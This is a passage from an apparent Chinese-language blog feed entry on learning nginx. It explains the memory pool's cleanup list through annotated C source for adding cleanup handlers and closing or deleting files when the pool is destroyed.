通过cleanup的机制，我们就可以在内存池上保存例如文件句柄fd的资源。当我们调用ngx_destroy_pool方法销毁内存池的时候，首先会来清理pool-&gt;cleanup，并且都会执行c-&gt;handler(c-&gt;data)回调函数，用于清理资源。</p><p>Nginx的这个机制，最显著的就是让文件描述符和需要自定义清理的数据的管理变得更加简单。</p><p>分配一个cleanup结构：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 分配一个可以用于回调函数清理内存块的内存</span><br><span class="line"> * 内存块仍旧在p-&gt;d或p-&gt;large上</span><br><span class="line"> *</span><br><span class="line"> * ngx_pool_t中的cleanup字段管理着一个特殊的链表，该链表的每一项都记录着一个特殊的需要释放的资源。</span><br><span class="line"> * 对于这个链表中每个节点所包含的资源如何去释放，是自说明的。这也就提供了非常大的灵活性。</span><br><span class="line"> * 意味着，ngx_pool_t不仅仅可以管理内存，通过这个机制，也可以管理任何需要释放的资源，</span><br><span class="line"> * 例如，关闭文件，或者删除文件等等的。下面我们看一下这个链表每个节点的类型</span><br><span class="line"> *</span><br><span class="line"> * 一般分两种情况：</span><br><span class="line"> * 1. 文件描述符</span><br><span class="line"> * 2. 外部自定义回调函数可以来清理内存</span><br><span class="line"> */</span><br><span class="line">ngx_pool_cleanup_t *</span><br><span class="line">ngx_pool_cleanup_add(ngx_pool_t *p, size_t size) &#123;</span><br><span class="line">    ngx_pool_cleanup_t *c;</span><br><span class="line"> </span><br><span class="line">    /* 分配一个ngx_pool_cleanup_t */</span><br><span class="line">    c = ngx_palloc(p, sizeof(ngx_pool_cleanup_t));</span><br><span class="line">    if (c == NULL) &#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /* 如果size !=0 从pool-&gt;d或pool-&gt;large分配一个内存块 */</span><br><span class="line">    if (size) &#123;</span><br><span class="line">        /*  */</span><br><span class="line">        c-&gt;data = ngx_palloc(p, size);</span><br><span class="line">        if (c-&gt;data == NULL) &#123;</span><br><span class="line">            return NULL;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        c-&gt;data = NULL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /* handler为回调函数 */</span><br><span class="line">    c-&gt;handler = NULL;</span><br><span class="line">    c-&gt;next = p-&gt;cleanup;</span><br><span class="line"> </span><br><span class="line">    p-&gt;cleanup = c;</span><br><span class="line"> </span><br><span class="line">    ngx_log_debug1(NGX_LOG_DEBUG_ALLOC, p-&gt;log, 0, &quot;add cleanup: %p&quot;, c);</span><br><span class="line"> </span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>手动清理 p-&gt;cleanup链表上的数据：（内存池销毁函数ngx_destroy_pool也会清理p-&gt;cleanup）</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 清除 p-&gt;cleanup链表上的内存块（主要是文件描述符）</span><br><span class="line"> * 回调函数：ngx_pool_cleanup_file</span><br><span class="line"> */</span><br><span class="line">void ngx_pool_run_cleanup_file(ngx_pool_t *p, ngx_fd_t fd) &#123;</span><br><span class="line">    ngx_pool_cleanup_t *c;</span><br><span class="line">    ngx_pool_cleanup_file_t *cf;</span><br><span class="line"> </span><br><span class="line">    for (c = p-&gt;cleanup; c; c = c-&gt;next) &#123;</span><br><span class="line">        if (c-&gt;handler == ngx_pool_cleanup_file) &#123;</span><br><span class="line"> </span><br><span class="line">            cf = c-&gt;data;</span><br><span class="line"> </span><br><span class="line">            if (cf-&gt;fd == fd) &#123;</span><br><span class="line">                c-&gt;handler(cf); /* 调用回调函数 */</span><br><span class="line">                c-&gt;handler = NULL;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>关闭文件的回调函数和删除文件的回调函数。这个是文件句柄通用的回调函数，可以放置在p-&gt;cleanup-&gt;handler上。 </p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 关闭文件回调函数</span><br><span class="line"> * ngx_pool_run_cleanup_file方法执行的时候，用了此函数作为回调函数的，都会被清理</span><br><span class="line"> */</span><br><span class="line">void ngx_pool_cleanup_file(void *data) &#123;</span><br><span class="line">    ngx_pool_cleanup_file_t *c = data;</span><br><span class="line"> </span><br><span class="line">    ngx_log_debug1(NGX_LOG_DEBUG_ALLOC, c-&gt;log, 0, &quot;file cleanup: fd:%d&quot;,</span><br><span class="line">            c-&gt;fd);</span><br><span class="line"> </span><br><span class="line">    if (ngx_close_file(c-&gt;fd) == NGX_FILE_ERROR) &#123;</span><br><span class="line">        ngx_log_error(NGX_LOG_ALERT, c-&gt;log, ngx_errno,</span><br><span class="line">                ngx_close_file_n &quot; \&quot;%s\&quot; failed&quot;, c-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 删除文件回调函数</span><br><span class="line"> */</span><br><span class="line">void ngx_pool_delete_file(void *data) &#123;</span><br><span class="line">    ngx_pool_cleanup_file_t *c = data;</span><br><span class="line"> </span><br><span class="line">    ngx_err_t err;</span><br><span class="line"> </span><br><span class="line">    ngx_log_debug2(NGX_LOG_DEBUG_ALLOC, c-&gt;log, 0, &quot;file cleanup: fd:%d %s&quot;,</span><br><span class="line">            c-&gt;fd, c-&gt;name);</span><br><span class="line"> </span><br><span class="line">    if (ngx_delete_file(c-&gt;name) == NGX_FILE_ERROR) &#123;</span><br><span class="line">        err = ngx_errno;</span><br><span class="line"> </span><br><span class="line">        if (err != NGX_ENOENT) &#123;</span><br><span class="line">            ngx_log_error(NGX_LOG_CRIT, c-&gt;log, err,</span><br><span class="line">                    ngx_delete_file_n &quot; \&quot;%s\&quot; failed&quot;, c-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if (ngx_close_file(c-&gt;fd) == NGX_FILE_ERROR) &#123;</span><br><span class="line">        ngx_log_error(NGX_LOG_ALERT, c-&gt;log, ngx_errno,</span><br><span class="line">                ngx_close_file_n &quot; \&quot;%s\&quot; failed&quot;, c-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;nginx学习入门&lt;/p&gt;
    
    </summary>
    
      <category term="nginx" scheme="http://javastar.club/categories/nginx/"/>
    
    
      <category term="nginx" scheme="http://javastar.club/tags/nginx/"/>
    
  </entry>
  
</feed>
